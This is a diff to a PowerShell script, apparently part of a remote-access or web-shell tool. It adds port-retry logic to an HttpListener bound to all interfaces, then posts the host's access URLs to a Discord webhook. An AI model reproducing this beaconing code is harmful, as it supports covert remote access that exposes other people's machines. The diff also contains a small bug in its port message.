@@ -129,8 +129,36 @@ $html = @"
 
 # HTTP Server
 $listener = New-Object System.Net.HttpListener
-$listener.Prefixes.Add("http://+:$port/")
-$listener.Start()
+
+# Try to find available port
+$availablePort = $port
+while ($true) {
+    try {
+        $listener.Prefixes.Add("http://+:$availablePort/")
+        $listener.Start()
+        break
+    } catch {
+        $listener.Close()
+        $listener = New-Object System.Net.HttpListener
+        $availablePort++
+        if ($availablePort -gt $port + 10) {
+            Write-Host "No available ports found"
+            exit
+        }
+    }
+}
+
+# Update port if changed
+if ($availablePort -ne $port) {
+    $port = $availablePort
+    # Send updated port to Discord
+    try {
+        $body = @{content="Port $port was busy! Using port $availablePort instead. Access URLs:\n$($ips | ForEach-Object { \"http://$_`:$availablePort\" })"} | ConvertTo-Json
+        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
+    } catch {
+        # If Discord fails, continue anyway
+    }
+}
 
 $outputBuffer = ""
 
